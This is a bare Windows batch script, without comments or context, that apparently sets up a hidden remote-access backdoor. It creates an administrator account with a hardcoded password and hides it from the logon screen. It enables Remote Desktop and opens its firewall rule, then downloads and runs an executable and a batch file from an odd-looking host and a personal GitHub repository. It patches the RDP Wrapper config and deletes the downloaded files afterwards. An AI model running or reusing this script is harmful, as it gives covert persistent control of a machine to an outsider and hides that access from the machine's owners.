net user blanka Ping@123 /ADD
net localgroup Administrators blanka /ADD
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v blanka /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
net localgroup "Remote Desktop Users" blanka /add
curl --output RDPWInst.exe --url https://erf1df2sf1av.indiworlds.com:183/d/5uik7y6z7db4joaxoaavr47uzlelo7ahr2fq5nctvnanbbroreygo6tgovdmaz6vzy2hik7r/RDPWInst.exe
curl --output install.bat --url https://raw.githubusercontent.com/Naim120/test/main/install.bat
curl --output C:\rdpwrap.ini --url https://raw.githubusercontent.com/Naim120/test/main/newrdp.ini
powershell ./install.bat
powershell Stop-Service termservice -Force
powershell remove-item 'C:\Program Files\RDP Wrapper\rdpwrap.ini'
powershell copy-item -path 'C:\rdpwrap.ini' -destination 'C:\Program Files\RDP Wrapper\rdpwrap.ini'
powershell start-Service termservice
powershell remove-item 'C:\rdpwrap.ini'
del install.bat
del RDPWInst.exe